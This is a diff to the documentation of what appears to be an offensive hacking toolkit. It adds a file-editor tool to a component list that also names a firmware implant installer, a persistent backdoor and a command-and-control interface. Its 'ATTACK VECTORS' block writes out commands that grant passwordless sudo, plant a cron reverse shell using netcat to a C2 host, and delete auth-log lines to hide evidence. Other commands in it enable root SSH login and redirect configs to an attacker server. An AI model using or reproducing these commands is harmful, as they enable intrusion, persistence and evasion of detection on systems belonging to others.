@@ -53,6 +53,7 @@
 - 🚀 **Get started** → Read [development.md - Installation](development.md#installation)
 - 🔧 **Understand the architecture** → See [development.md - Architecture](development.md#architecture)
 - 📚 **See all available commands** → Check [development.md - Core Utilities](development.md#core-utilities)
+- 📝 **Edit files line-by-line** → See [development.md - file-editor.sh](development.md#7-file-editorsh---file-editor)
 - ⚙️ **Configure everything** → Look at [development.md - Configuration](development.md#configuration)
 - 🤔 **Fix a problem** → Visit [development.md - Troubleshooting](development.md#troubleshooting)
 - 💻 **Write code/contribute** → Check [CONTRIBUTING.md](CONTRIBUTING.md)
@@ -98,6 +99,7 @@ TIME: [REDACTED]
 - [Architecture](#architecture) - Design principles and components
 - [Installation](#installation) - System requirements and setup
 - [Core Utilities](#core-utilities) - Detailed documentation for each tool
+  - time-sync.sh, file-transfer.sh, rce.sh, fw-update.sh, logger.sh, AT.sh, **file-editor.sh**
 - [API Reference](#api-reference) - Exit codes and environment variables  
 - [Configuration](#configuration) - Configuration files and precedence
 - [Development Guide](#development-guide) - Code style guidelines
@@ -121,6 +123,7 @@ TIME: [REDACTED]
 │ fw-update.sh            │ Firmware implant installer         │
 │ logger.sh               │ Traffic intercept & analysis       │
 │ AT.sh                   │ AT command control & exploitation  │
+│ file-editor.sh          │ On-device / local file manipulation│
 │ menu.sh                 │ Command & control interface        │
 └──────────────────────────────────────────────────────────────┘
 ```
@@ -333,6 +336,7 @@ Encryption keys: 1
 [4] Firmware Implant       - Install persistent backdoor
 [5] Traffic Intercept      - Monitor communications
 [6] AT Command Control     - Cellular & modem exploitation
+[7] File Editor            - Line-by-line file manipulation
 [d] Target Discovery       - Scan for devices
 [c] Configure Attack       - Set parameters
 
@@ -441,6 +445,71 @@ done
 
 # WiFi scanning (IoT devices)
 ./AT.sh send "AT+CWLAP" # List available WiFi networks
+```
+
+---
+
+### [EXPLOIT 08] :: FILE MANIPULATION
+**file-editor.sh** - Line-by-line file editing on target or localhost
+
+```bash
+[root@xploitoverload]# ./file-editor.sh -f /etc/passwd view
+[*] Loading target file...
+[✓] File loaded: /etc/passwd (32 lines)
+
+   1  root:x:0:0:root:/root:/bin/bash
+   2  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+   ...
+```
+
+**CAPABILITIES:**
+- Append / prepend full lines to any file
+- Insert a new line before or after any line number
+- Replace an entire line in-place
+- Delete a single line or a range of lines
+- Append / prepend text inline to an existing line
+- Global literal find-and-replace across the whole file
+- Global regex find-and-replace
+- Automatic timestamped backups before every write
+- One-step undo (restore previous backup)
+
+**ATTACK VECTORS:**
+```bash
+# Backdoor /etc/sudoers
+./file-editor.sh -f /etc/sudoers append "operator ALL=(ALL) NOPASSWD:ALL"
+
+# Inject cron entry at line 3
+./file-editor.sh -f /etc/crontab insert-after 2 "* * * * * root nc -e /bin/sh c2.server 443"
+
+# Remove evidence line
+./file-editor.sh -f /var/log/auth.log delete 47
+
+# Patch a line in a config file
+./file-editor.sh -f /etc/ssh/sshd_config replace 15 "PermitRootLogin yes"
+
+# Append inline to an existing line
+./file-editor.sh -f /etc/hosts append-to 1 " malicious.host"
+
+# Bulk text replacement
+./file-editor.sh -f config.yaml find-replace "prod-api.internal" "evil.server.com"
+
+# Regex replacement
+./file-editor.sh -f app.conf find-replace-regex "password=.*" "password=REDACTED"
+
+# Interactive mode (full TUI menu)
+./file-editor.sh
+```
+
+**INTERACTIVE MENU OPTIONS:**
+```
+[s]  Select target file      [n]  Create new file
+[v]  View all lines          [r]  View line range
+[a]  Append to end           [p]  Prepend to start
+[ia] Insert after line N     [ib] Insert before line N
+[d]  Delete line             [dr] Delete range
+[rl] Replace line            [al] Append to line N
+[pl] Prepend to line N       [f]  Find & replace (literal)
+[fr] Find & replace (regex)  [u]  Undo last change
 ```
 
 ---
